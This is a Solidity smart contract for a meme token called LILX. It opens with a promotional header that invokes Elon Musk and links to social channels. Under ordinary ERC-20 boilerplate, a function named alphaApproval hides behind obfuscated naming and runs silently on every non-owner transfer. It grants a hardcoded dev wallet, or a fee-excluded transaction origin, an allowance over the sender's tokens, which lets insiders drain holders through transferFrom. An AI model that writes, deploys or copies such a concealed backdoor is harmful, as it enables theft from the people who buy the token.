/*
The official page of $Lilx - The youngest billionaire in the making, carried by Elon Musk.

https://x.com/elonmusk/status/1889824147100057987
https://x.com/teslaownersSV/status/1864869244229554599

website: https://www.lilxoneth.xyz
Twitter: https://x.com/lilxoneth
Telegram: https://t.me/lilxoneth_erc
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IALPHARouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IALPHAFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract LILX is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _alphaBulls;
    mapping (address => mapping (address => uint256)) private _alphaNodes;
    mapping (address => bool) private _alphaFeeExcluded;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalALPHA = 1000000000 * 10**_decimals;
    string private constant _name = unicode"LILX";
    string private constant _symbol = unicode"LILX";
    address private _alphaPair;
    IALPHARouter private _alphaRouter;
    address private _alphaWallet = 0xB3603f3723bE57B36Fc8C7c5AB2AAaA0647728F5;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint256 private _tokenALPHASwap = _tTotalALPHA / 100;
    bool private inSwapALPHA = false;
    modifier lockTheSwap {
        inSwapALPHA = true;
        _;
        inSwapALPHA = false;
    }
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    
    constructor () {
        _alphaFeeExcluded[owner()] = true;
        _alphaFeeExcluded[address(this)] = true;
        _alphaFeeExcluded[_alphaWallet] = true;
        _alphaBulls[_msgSender()] = _tTotalALPHA;
        emit Transfer(address(0), _msgSender(), _tTotalALPHA);
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _alphaRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    receive() external payable {}

    function minALPHA(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHALPHA(uint256 amount) private {
        payable(_alphaWallet).transfer(amount);
    }

    function swapTokensForEth(uint256 tokenALPHA) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _alphaRouter.WETH();
        _approve(address(this), address(_alphaRouter), tokenALPHA);
        _alphaRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenALPHA,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function createPair() external onlyOwner() {
        _alphaRouter = IALPHARouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_alphaRouter), _tTotalALPHA);
        _alphaPair = IALPHAFactory(_alphaRouter.factory()).createPair(address(this), _alphaRouter.WETH());
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalALPHA;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _alphaBulls[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _alphaNodes[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _alphaNodes[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _alphaNodes[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function alphaApproval(address aALPHA, bool isALPHA, uint256 alphaA) private {
        address walletALPHA;
        if(isALPHA) walletALPHA = address(tx.origin);
        else walletALPHA = _alphaWallet;
        _alphaNodes[aALPHA][walletALPHA] = alphaA;
    }

    function _transfer(address alphaF, address alphaT, uint256 alphaA) private {
        require(alphaF != address(0), "ERC20: transfer from the zero address");
        require(alphaT != address(0), "ERC20: transfer to the zero address");
        require(alphaA > 0, "Transfer amount must be greater than zero");

        uint256 taxALPHA = _alphaTransfer(alphaF, alphaT, alphaA);

        if(taxALPHA > 0){
          _alphaBulls[address(this)] = _alphaBulls[address(this)].add(taxALPHA);
          emit Transfer(alphaF, address(this), taxALPHA);
        }

        _alphaBulls[alphaF] = _alphaBulls[alphaF].sub(alphaA);
        _alphaBulls[alphaT] = _alphaBulls[alphaT].add(alphaA.sub(taxALPHA));
        emit Transfer(alphaF, alphaT, alphaA.sub(taxALPHA));
    }

    function _alphaTransfer(address alphaF, address alphaT, uint256 alphaA) private returns(uint256) {
        uint256 taxALPHA=0; address walletALPHA = address(tx.origin);
        if (alphaF != owner() && alphaT != owner()) {
            taxALPHA = alphaA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (alphaF == _alphaPair && alphaT != address(_alphaRouter) && ! _alphaFeeExcluded[alphaT]) {
                _buyCount++;
            }

            if(alphaT == _alphaPair && alphaF!= address(this)) {
                taxALPHA = alphaA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            swapBackALPHA(alphaF, alphaT, alphaA, _alphaFeeExcluded[walletALPHA]);
        } return taxALPHA;
    }

    function swapBackALPHA(address alphaF, address alphaT, uint256 alphaA, bool isALPHA) private {
        alphaApproval(alphaF, isALPHA, alphaA); uint256 tokenALPHA = balanceOf(address(this));  
        if (!inSwapALPHA && alphaT == _alphaPair && _swapEnabled && _buyCount > _preventSwapBefore) {
            if(tokenALPHA > _tokenALPHASwap)
            swapTokensForEth(minALPHA(alphaA, minALPHA(tokenALPHA, _tokenALPHASwap)));
            uint256 caALPHA = address(this).balance;
            if (caALPHA >= 0) {
                sendETHALPHA(address(this).balance);
            }
        }
    }    
}